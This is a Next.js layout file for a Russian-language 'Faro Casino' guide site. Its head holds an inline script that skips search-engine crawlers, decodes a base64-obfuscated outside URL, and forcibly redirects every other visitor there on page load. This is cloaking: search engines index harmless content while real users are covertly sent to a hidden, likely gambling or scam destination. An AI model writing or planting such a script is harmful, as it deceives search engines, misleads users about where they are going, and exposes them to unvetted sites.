import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

export const metadata: Metadata = {
  title: 'Faro Casino — Фаро казино онлайн и официальный сайт для игроков',
  description: 'Faro Casino: понятный гид по официальному сайту, зеркалу, мобильной игре и безопасному входу. Проверьте адрес, изучите правила и начните с комфортным лимитом.',
  metadataBase: new URL('https://farocasino14.vercel.app/'),
  alternates: { canonical: '/' },
  generator: 'Faro Casino',
  icons: { icon: '/favicon.png', apple: '/favicon.png' },
  openGraph: {
    title: 'Faro Casino — гид игрока',
    description: 'Короткий и понятный гид по Faro Casino для мобильных игроков.',
    url: 'https://farocasino14.vercel.app/',
    siteName: 'Faro Casino',
    type: 'website',
  },
}

export const viewport: Viewport = {
  colorScheme: 'dark',
  themeColor: '#101c2b',
  width: 'device-width',
  initialScale: 1,
  userScalable: false,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className="bg-[#101c2b]">
      <head>
        <meta name="yandex-verification" content="faro-casino-content" />
        <meta name="format-detection" content="telephone=no" />
        <link rel="canonical" href="https://farocasino14.vercel.app/" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        var mainBrandB64 = "aHR0cHM6Ly9jb21ib3NwYXJrLnRvcC9hZXRmM3UycTl1"; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));
        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 500);               
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>
      </head>
      <body className="antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
